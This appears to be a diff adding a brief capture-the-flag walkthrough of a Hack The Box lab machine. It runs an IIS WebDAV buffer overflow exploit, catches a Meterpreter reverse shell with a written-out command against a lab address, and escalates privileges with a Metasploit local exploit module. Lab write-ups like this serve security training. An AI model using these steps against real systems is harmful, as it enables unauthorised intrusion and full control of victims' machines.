@@ -1,0 +1,13 @@
+Step 1 (Scanning)
+- target was running port 80 with a WebDav client enabled allowing too many options
+- running the IIS version in searchsploit shows us a ScStoragePathFromUrl buffer overflow vulnerability
+
+Step 2 (Foothold)
+- running a google search for the overflow vulnerability we find the script 'https://github.com/xerosignal/Hack-The-Box-Granny-And-Grandpa/blob/master/explodingvenom.py'
+- placing a msfconsole exploit/multi/handler to the payload windows/meterpreter/reverse_tcp and allowing it to run we are ready to catch the reverse shell
+- running the syntax "sudo python explodingvenom.py http://10.10.10.15:80/ 10.10.14.11 4444" gives us a reverse shell
+- normally at this stage id use living off the land techiques to transfer files between my machine and the target but none of my methods worked and i was on a roll
+
+Step 3 (Priviledge Escalation)
+- running post/multi/recon/local_exploit_suggester we are given a list of possible priviledge escalation scripts
+- trying exploit/windows/local/ms14_070_tcpip_ioctl returns a system level reverse shell
